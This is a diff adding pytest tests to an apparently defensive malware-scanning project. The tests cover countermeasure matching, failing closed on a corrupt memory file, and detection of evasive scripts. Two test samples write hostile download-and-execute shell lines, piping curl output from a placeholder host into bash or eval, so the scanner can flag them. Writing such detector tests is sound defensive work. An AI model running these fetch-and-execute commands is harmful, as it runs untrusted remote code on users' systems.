@@ -32,6 +32,31 @@ def test_unknown_threat_is_learned_and_reused(tmp_path):
     assert system.general.scan(variant) == "neutralize-simulated-trojan"
 
 
+def test_memory_prefers_more_specific_trigger(tmp_path):
+    from bioaegis.memory import ImmuneMemory
+    from bioaegis.models import Countermeasure
+
+    memory = ImmuneMemory(tmp_path / "memory.json")
+    broad = Countermeasure("broad", frozenset({"network"}), ("QUARANTINE_FILE", "VERIFY_QUARANTINE"), "broad")
+    specific = Countermeasure("specific", frozenset({"network", "reverse-shell"}), ("QUARANTINE_FILE", "VERIFY_QUARANTINE"), "specific")
+    memory.remember(broad)
+    memory.remember(specific)
+
+    assert memory.match(frozenset({"network", "reverse-shell"})) == specific
+
+
+def test_corrupt_memory_fails_closed(tmp_path):
+    from bioaegis.memory import ImmuneMemory
+
+    memory_path = tmp_path / "memory.json"
+    memory_path.write_text('{"not": "a list"}\n', encoding="utf-8")
+    memory = ImmuneMemory(memory_path)
+    memory.load()
+
+    assert memory.entries == ()
+    assert memory.match(frozenset({"anything"})) is None
+
+
 def test_validator_rejects_unsafe_actions():
     from bioaegis.models import Countermeasure
     from bioaegis.validator import Validator
@@ -59,6 +84,30 @@ def test_host_scanner_finds_static_suspicious_behavior(tmp_path):
     assert len(findings) == 1
     assert "download-and-execute" in findings[0].behaviors
     assert findings[0].sha256
+
+
+def test_host_scanner_detects_multiline_download_evasion(tmp_path):
+    from bioaegis.host_scanner import HostScanner
+
+    sample = tmp_path / "multiline.sh"
+    sample.write_text("#!/bin/sh\ncurl https://example.invalid/a \\\n| bash\n", encoding="utf-8")
+    sample.chmod(0o700)
+
+    findings = HostScanner().scan(sample)
+    assert len(findings) == 1
+    assert "download-and-execute" in findings[0].behaviors
+
+
+def test_host_scanner_detects_download_eval_evasion(tmp_path):
+    from bioaegis.host_scanner import HostScanner
+
+    sample = tmp_path / "eval.sh"
+    sample.write_text('eval "$(curl https://example.invalid/a)"\n', encoding="utf-8")
+    sample.chmod(0o700)
+
+    findings = HostScanner().scan(sample)
+    assert len(findings) == 1
+    assert "download-eval" in findings[0].behaviors
 
 
 def test_host_scanner_ignores_binary_pattern_noise(tmp_path):
